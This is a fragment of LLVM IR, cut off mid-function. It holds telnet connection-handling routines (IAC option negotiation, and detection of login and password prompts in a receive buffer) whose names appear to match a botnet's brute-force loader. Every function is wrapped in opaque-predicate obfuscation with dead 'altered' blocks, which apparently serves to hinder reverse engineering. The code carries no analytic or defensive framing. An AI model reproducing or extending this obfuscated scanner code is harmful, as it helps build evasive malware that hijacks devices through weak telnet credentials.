  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %150, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @connection_consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %151 = load %struct.connection*, %struct.connection** %2, align 8
  %152 = load i8*, i8** %4, align 8
  %153 = call signext i8 @can_consume(%struct.connection* %151, i8* %152, i32 2)
  %154 = icmp ne i8 %153, 0
  br i1 %154, label %156, label %155

; <label>:155:                                    ; preds = %148
  br label %282

; <label>:156:                                    ; preds = %148
  %157 = load i32, i32* @x.3
  %158 = load i32, i32* @y.4
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %156
  %165 = load i8*, i8** %4, align 8
  %166 = getelementptr inbounds i8, i8* %165, i64 2
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp ne i32 %168, 31
  %170 = load i32, i32* @x.3
  %171 = load i32, i32* @y.4
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %169, label %178, label %179

; <label>:178:                                    ; preds = %originalBBpart224
  br label %227

; <label>:179:                                    ; preds = %originalBBpart224
  %180 = load i32, i32* @x.3
  %181 = load i32, i32* @y.4
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %179
  %188 = load i8*, i8** %4, align 8
  %189 = getelementptr inbounds i8, i8* %188, i64 3
  store i8* %189, i8** %4, align 8
  %190 = load i32, i32* %3, align 4
  %191 = add nsw i32 %190, 3
  store i32 %191, i32* %3, align 4
  %192 = load %struct.connection*, %struct.connection** %2, align 8
  %193 = getelementptr inbounds %struct.connection, %struct.connection* %192, i32 0, i32 4
  %194 = load i32, i32* %193, align 8
  %195 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %196 = call i64 @send(i32 %194, i8* %195, i64 3, i32 16384)
  %197 = load %struct.connection*, %struct.connection** %2, align 8
  %198 = getelementptr inbounds %struct.connection, %struct.connection* %197, i32 0, i32 4
  %199 = load i32, i32* %198, align 8
  %200 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %201 = call i64 @send(i32 %199, i8* %200, i64 9, i32 16384)
  %202 = load i32, i32* @x.3
  %203 = load i32, i32* @y.4
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %278

; <label>:210:                                    ; preds = %originalBBpart220
  %211 = load i32, i32* @x.3
  %212 = load i32, i32* @y.4
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %210
  %219 = load i32, i32* @x.3
  %220 = load i32, i32* @y.4
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %227

; <label>:227:                                    ; preds = %originalBBpart232, %178
  %228 = load %struct.connection*, %struct.connection** %2, align 8
  %229 = load i8*, i8** %4, align 8
  %230 = call signext i8 @can_consume(%struct.connection* %228, i8* %229, i32 2)
  %231 = icmp ne i8 %230, 0
  br i1 %231, label %233, label %232

; <label>:232:                                    ; preds = %227
  br label %282

; <label>:233:                                    ; preds = %227
  store i32 0, i32* %5, align 4
  br label %234

; <label>:234:                                    ; preds = %265, %233
  %235 = load i32, i32* %5, align 4
  %236 = icmp slt i32 %235, 3
  br i1 %236, label %237, label %268

; <label>:237:                                    ; preds = %234
  %238 = load i8*, i8** %4, align 8
  %239 = load i32, i32* %5, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds i8, i8* %238, i64 %240
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp eq i32 %243, 253
  br i1 %244, label %245, label %250

; <label>:245:                                    ; preds = %237
  %246 = load i8*, i8** %4, align 8
  %247 = load i32, i32* %5, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds i8, i8* %246, i64 %248
  store i8 -4, i8* %249, align 1
  br label %264

; <label>:250:                                    ; preds = %237
  %251 = load i8*, i8** %4, align 8
  %252 = load i32, i32* %5, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds i8, i8* %251, i64 %253
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 251
  br i1 %257, label %258, label %263

; <label>:258:                                    ; preds = %250
  %259 = load i8*, i8** %4, align 8
  %260 = load i32, i32* %5, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds i8, i8* %259, i64 %261
  store i8 -3, i8* %262, align 1
  br label %263

; <label>:263:                                    ; preds = %258, %250
  br label %264

; <label>:264:                                    ; preds = %263, %245
  br label %265

; <label>:265:                                    ; preds = %264
  %266 = load i32, i32* %5, align 4
  %267 = add nsw i32 %266, 1
  store i32 %267, i32* %5, align 4
  br label %234

; <label>:268:                                    ; preds = %234
  %269 = load %struct.connection*, %struct.connection** %2, align 8
  %270 = getelementptr inbounds %struct.connection, %struct.connection* %269, i32 0, i32 4
  %271 = load i32, i32* %270, align 8
  %272 = load i8*, i8** %4, align 8
  %273 = call i64 @send(i32 %271, i8* %272, i64 3, i32 16384)
  %274 = load i8*, i8** %4, align 8
  %275 = getelementptr inbounds i8, i8* %274, i64 3
  store i8* %275, i8** %4, align 8
  %276 = load i32, i32* %3, align 4
  %277 = add nsw i32 %276, 3
  store i32 %277, i32* %3, align 4
  br label %278

; <label>:278:                                    ; preds = %268, %originalBBpart228
  br label %279

; <label>:279:                                    ; preds = %278
  br label %280

; <label>:280:                                    ; preds = %279, %originalBBpart212
  br label %281

; <label>:281:                                    ; preds = %280
  br label %11

; <label>:282:                                    ; preds = %232, %155, %originalBBpart216, %originalBBpart28, %originalBBpart2
  %283 = load i32, i32* %3, align 4
  ret i32 %283

originalBBalteredBB:                              ; preds = %originalBB, %11
  %284 = load i32, i32* %3, align 4
  %285 = load %struct.connection*, %struct.connection** %2, align 8
  %286 = getelementptr inbounds %struct.connection, %struct.connection* %285, i32 0, i32 9
  %287 = load i16, i16* %286, align 8
  %288 = zext i16 %287 to i32
  %289 = icmp slt i32 %284, %288
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %290 = load i8*, i8** %4, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  %293 = icmp ne i32 %292, 255
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %72
  %294 = load i8*, i8** %4, align 8
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 255
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %98
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %126
  %298 = load i8*, i8** %4, align 8
  %299 = getelementptr inbounds i8, i8* %298, i64 1
  %300 = load i8, i8* %299, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 253
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %156
  %303 = load i8*, i8** %4, align 8
  %304 = getelementptr inbounds i8, i8* %303, i64 2
  %305 = load i8, i8* %304, align 1
  %306 = zext i8 %305 to i32
  %307 = icmp ne i32 %306, 31
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %179
  %308 = load i8*, i8** %4, align 8
  %309 = getelementptr inbounds i8, i8* %308, i64 3
  store i8* %309, i8** %4, align 8
  %310 = load i32, i32* %3, align 4
  %_ = sub i32 %310, 3
  %gen = mul i32 %_, 3
  %311 = add nsw i32 %310, 3
  store i32 %311, i32* %3, align 4
  %312 = load %struct.connection*, %struct.connection** %2, align 8
  %313 = getelementptr inbounds %struct.connection, %struct.connection* %312, i32 0, i32 4
  %314 = load i32, i32* %313, align 8
  %315 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %316 = call i64 @send(i32 %314, i8* %315, i64 3, i32 16384)
  %317 = load %struct.connection*, %struct.connection** %2, align 8
  %318 = getelementptr inbounds %struct.connection, %struct.connection* %317, i32 0, i32 4
  %319 = load i32, i32* %318, align 8
  %320 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %321 = call i64 @send(i32 %319, i8* %320, i64 9, i32 16384)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %210
  br label %originalBB30
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.connection*, i8*, i32) #0 {
  %4 = alloca %struct.connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.connection* %0, %struct.connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %4, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 15
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.connection*, %struct.connection** %4, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 9
  %13 = load i16, i16* %12, align 8
  %14 = zext i16 %13 to i32
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %10, i64 %15
  store i8* %16, i8** %7, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = load i32, i32* %6, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = load i8*, i8** %7, align 8
  %22 = icmp ult i8* %20, %21
  %23 = zext i1 %22 to i32
  %24 = trunc i32 %23 to i8
  ret i8 %24
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_login_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %111, %1
  %13 = load i32, i32* %5, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %114

; <label>:15:                                     ; preds = %12
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  br i1 %23, label %108, label %24

; <label>:24:                                     ; preds = %15
  %25 = load i32, i32* @x.7
  %26 = load i32, i32* @y.8
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 15
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [8192 x i8], [8192 x i8]* %34, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 62
  %41 = load i32, i32* @x.7
  %42 = load i32, i32* @y.8
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %40, label %108, label %49

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load %struct.connection*, %struct.connection** %3, align 8
  %51 = getelementptr inbounds %struct.connection, %struct.connection* %50, i32 0, i32 15
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [8192 x i8], [8192 x i8]* %51, i64 0, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 36
  br i1 %57, label %108, label %58

; <label>:58:                                     ; preds = %49
  %59 = load i32, i32* @x.7
  %60 = load i32, i32* @y.8
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  %67 = load %struct.connection*, %struct.connection** %3, align 8
  %68 = getelementptr inbounds %struct.connection, %struct.connection* %67, i32 0, i32 15
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [8192 x i8], [8192 x i8]* %68, i64 0, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 35
  %75 = load i32, i32* @x.7
  %76 = load i32, i32* @y.8
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %108, label %83

; <label>:83:                                     ; preds = %originalBBpart24
  %84 = load i32, i32* @x.7
  %85 = load i32, i32* @y.8
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = load %struct.connection*, %struct.connection** %3, align 8
  %93 = getelementptr inbounds %struct.connection, %struct.connection* %92, i32 0, i32 15
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [8192 x i8], [8192 x i8]* %93, i64 0, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 37
  %100 = load i32, i32* @x.7
  %101 = load i32, i32* @y.8
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %99, label %108, label %110

; <label>:108:                                    ; preds = %originalBBpart28, %originalBBpart24, %49, %originalBBpart2, %15
  %109 = load i32, i32* %5, align 4
  store i32 %109, i32* %6, align 4
  br label %114

; <label>:110:                                    ; preds = %originalBBpart28
  br label %111

; <label>:111:                                    ; preds = %110
  %112 = load i32, i32* %5, align 4
  %113 = add nsw i32 %112, -1
  store i32 %113, i32* %5, align 4
  br label %12

; <label>:114:                                    ; preds = %108, %12
  %115 = load i32, i32* @x.7
  %116 = load i32, i32* @y.8
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %114
  %123 = load i32, i32* %6, align 4
  %124 = icmp eq i32 %123, -1
  %125 = load i32, i32* @x.7
  %126 = load i32, i32* @y.8
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %124, label %133, label %191

; <label>:133:                                    ; preds = %originalBBpart212
  %134 = load %struct.connection*, %struct.connection** %3, align 8
  %135 = getelementptr inbounds %struct.connection, %struct.connection* %134, i32 0, i32 15
  %136 = getelementptr inbounds [8192 x i8], [8192 x i8]* %135, i32 0, i32 0
  %137 = load %struct.connection*, %struct.connection** %3, align 8
  %138 = getelementptr inbounds %struct.connection, %struct.connection* %137, i32 0, i32 9
  %139 = load i16, i16* %138, align 8
  %140 = zext i16 %139 to i32
  %141 = call i32 @util_memsearch(i8* %136, i32 %140, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i32 4)
  store i32 %141, i32* %7, align 4
  %142 = icmp ne i32 %141, -1
  br i1 %142, label %143, label %145

; <label>:143:                                    ; preds = %133
  %144 = load i32, i32* %7, align 4
  store i32 %144, i32* %6, align 4
  br label %174

; <label>:145:                                    ; preds = %133
  %146 = load %struct.connection*, %struct.connection** %3, align 8
  %147 = getelementptr inbounds %struct.connection, %struct.connection* %146, i32 0, i32 15
  %148 = getelementptr inbounds [8192 x i8], [8192 x i8]* %147, i32 0, i32 0
  %149 = load %struct.connection*, %struct.connection** %3, align 8
  %150 = getelementptr inbounds %struct.connection, %struct.connection* %149, i32 0, i32 9
  %151 = load i16, i16* %150, align 8
  %152 = zext i16 %151 to i32
  %153 = call i32 @util_memsearch(i8* %148, i32 %152, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i32 5)
  store i32 %153, i32* %7, align 4
  %154 = icmp ne i32 %153, -1
  br i1 %154, label %155, label %157

; <label>:155:                                    ; preds = %145
  %156 = load i32, i32* %7, align 4
  store i32 %156, i32* %6, align 4
  br label %157

; <label>:157:                                    ; preds = %155, %145
  %158 = load i32, i32* @x.7
  %159 = load i32, i32* @y.8
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %157
  %166 = load i32, i32* @x.7
  %167 = load i32, i32* @y.8
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %174

; <label>:174:                                    ; preds = %originalBBpart216, %143
  %175 = load i32, i32* @x.7
  %176 = load i32, i32* @y.8
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %174
  %183 = load i32, i32* @x.7
  %184 = load i32, i32* @y.8
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %191

; <label>:191:                                    ; preds = %originalBBpart220, %originalBBpart212
  %192 = load i32, i32* %6, align 4
  %193 = icmp eq i32 %192, -1
  br i1 %193, label %194, label %211

; <label>:194:                                    ; preds = %191
  %195 = load i32, i32* @x.7
  %196 = load i32, i32* @y.8
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %194
  store i32 0, i32* %2, align 4
  %203 = load i32, i32* @x.7
  %204 = load i32, i32* @y.8
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %213

; <label>:211:                                    ; preds = %191
  %212 = load i32, i32* %6, align 4
  store i32 %212, i32* %2, align 4
  br label %213

; <label>:213:                                    ; preds = %211, %originalBBpart224
  %214 = load i32, i32* @x.7
  %215 = load i32, i32* @y.8
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %213
  %222 = load i32, i32* %2, align 4
  %223 = load i32, i32* @x.7
  %224 = load i32, i32* @y.8
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  ret i32 %222

originalBBalteredBB:                              ; preds = %originalBB, %24
  %231 = load %struct.connection*, %struct.connection** %3, align 8
  %232 = getelementptr inbounds %struct.connection, %struct.connection* %231, i32 0, i32 15
  %233 = load i32, i32* %5, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [8192 x i8], [8192 x i8]* %232, i64 0, i64 %234
  %236 = load i8, i8* %235, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp eq i32 %237, 62
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  %239 = load %struct.connection*, %struct.connection** %3, align 8
  %240 = getelementptr inbounds %struct.connection, %struct.connection* %239, i32 0, i32 15
  %241 = load i32, i32* %5, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds [8192 x i8], [8192 x i8]* %240, i64 0, i64 %242
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 35
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  %247 = load %struct.connection*, %struct.connection** %3, align 8
  %248 = getelementptr inbounds %struct.connection, %struct.connection* %247, i32 0, i32 15
  %249 = load i32, i32* %5, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds [8192 x i8], [8192 x i8]* %248, i64 0, i64 %250
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 37
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %114
  %255 = load i32, i32* %6, align 4
  %256 = icmp eq i32 %255, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %157
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %174
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %194
  store i32 0, i32* %2, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %213
  %257 = load i32, i32* %2, align 4
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_password_prompt(%struct.connection*) #0 {
  %2 = load i32, i32* @x.9
  %3 = load i32, i32* @y.10
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %11, align 8
  store i32 -1, i32* %14, align 4
  %16 = load %struct.connection*, %struct.connection** %11, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 9
  %18 = load i16, i16* %17, align 8
  %19 = zext i16 %18 to i32
  store i32 %19, i32* %13, align 4
  %20 = load i32, i32* @x.9
  %21 = load i32, i32* @y.10
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %111, %originalBBpart2
  %29 = load i32, i32* %13, align 4
  %30 = icmp sge i32 %29, 0
  br i1 %30, label %31, label %114

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* @x.9
  %33 = load i32, i32* @y.10
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = load %struct.connection*, %struct.connection** %11, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 15
  %42 = load i32, i32* %13, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [8192 x i8], [8192 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 58
  %48 = load i32, i32* @x.9
  %49 = load i32, i32* @y.10
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %47, label %108, label %56

; <label>:56:                                     ; preds = %originalBBpart24
  %57 = load i32, i32* @x.9
  %58 = load i32, i32* @y.10
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %56
  %65 = load %struct.connection*, %struct.connection** %11, align 8
  %66 = getelementptr inbounds %struct.connection, %struct.connection* %65, i32 0, i32 15
  %67 = load i32, i32* %13, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [8192 x i8], [8192 x i8]* %66, i64 0, i64 %68
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 62
  %73 = load i32, i32* @x.9
  %74 = load i32, i32* @y.10
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %72, label %108, label %81

; <label>:81:                                     ; preds = %originalBBpart28
  %82 = load %struct.connection*, %struct.connection** %11, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 15
  %84 = load i32, i32* %13, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds [8192 x i8], [8192 x i8]* %83, i64 0, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 36
  br i1 %89, label %108, label %90

